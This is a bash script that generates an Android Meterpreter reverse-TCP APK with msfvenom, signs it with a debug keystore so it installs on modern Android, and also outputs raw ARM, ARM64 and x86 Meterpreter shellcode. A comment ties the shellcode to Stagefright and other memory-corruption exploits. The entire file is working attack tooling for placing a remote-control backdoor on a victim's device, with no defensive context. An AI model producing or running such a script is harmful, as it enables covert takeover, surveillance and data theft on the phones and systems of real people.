#!/bin/bash
# gen_payload.sh — Generate Android Meterpreter payload with msfvenom
# Usage: ./gen_payload.sh <LHOST> <LPORT>

set -e

LHOST="${1}"
LPORT="${2:-4444}"

if [ -z "$LHOST" ]; then
    echo "Usage: $0 <LHOST> [LPORT]"
    echo "Example: $0 192.168.1.100 4444"
    exit 1
fi

echo "[*] LHOST: $LHOST"
echo "[*] LPORT: $LPORT"
echo ""

# Generate Android APK payload
echo "[*] Generating Android Meterpreter APK..."
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST="$LHOST" LPORT="$LPORT" \
    -o "payload_android.apk" \
    2>&1

echo "[+] APK generated: payload_android.apk"

# Sign the APK (Android requires signed APKs for installation)
if command -v apksigner &>/dev/null; then
    echo "[*] Signing APK with apksigner..."
    if [ -f ~/.android/debug.keystore ]; then
        apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android \
            payload_android.apk 2>&1
        echo "[+] APK signed"
    else
        echo "[!] Debug keystore not found at ~/.android/debug.keystore"
        echo "[*] Creating debug keystore..."
        keytool -genkey -v -keystore ~/.android/debug.keystore \
            -alias androiddebugkey -keyalg RSA -keysize 2048 \
            -validity 10000 -storepass android -keypass android \
            -dname "CN=Android Debug,O=Android,C=US" 2>&1
        apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android \
            payload_android.apk 2>&1
        echo "[+] APK signed"
    fi
elif command -v jarsigner &>/dev/null; then
    echo "[*] Signing APK with jarsigner..."
    if [ ! -f ~/.android/debug.keystore ]; then
        echo "[*] Creating debug keystore..."
        keytool -genkey -v -keystore ~/.android/debug.keystore \
            -alias androiddebugkey -keyalg RSA -keysize 2048 \
            -validity 10000 -storepass android -keypass android \
            -dname "CN=Android Debug,O=Android,C=US" 2>&1
    fi
    jarsigner -verbose -sigalg SHA1withRSA \
        -digestalg SHA1 -keystore ~/.android/debug.keystore \
        -storepass android payload_android.apk androiddebugkey 2>&1
    echo "[+] APK signed"
else
    echo "[!] APK signing tools not found. APK may be rejected on modern Android."
fi

# Generate raw ARM shellcode (for Stagefright or other memory corruption payloads)
echo ""
echo "[*] Generating ARM reverse TCP shellcode..."
msfvenom -p linux/armle/meterpreter/reverse_tcp \
    LHOST="$LHOST" LPORT="$LPORT" \
    -f raw -o "shellcode_arm.bin" \
    2>&1
echo "[+] ARM shellcode: shellcode_arm.bin"

echo ""
echo "[*] Generating ARM64 reverse TCP shellcode..."
msfvenom -p linux/aarch64/meterpreter/reverse_tcp \
    LHOST="$LHOST" LPORT="$LPORT" \
    -f raw -o "shellcode_arm64.bin" \
    2>&1
echo "[+] ARM64 shellcode: shellcode_arm64.bin"

echo ""
echo "[*] Generating x86 reverse TCP shellcode..."
msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST="$LHOST" LPORT="$LPORT" \
    -f raw -o "shellcode_x86.bin" \
    2>&1
echo "[+] x86 shellcode: shellcode_x86.bin"

echo ""
echo "[+] All payloads generated successfully."
ls -la payload_android.apk shellcode_*.bin 2>/dev/null
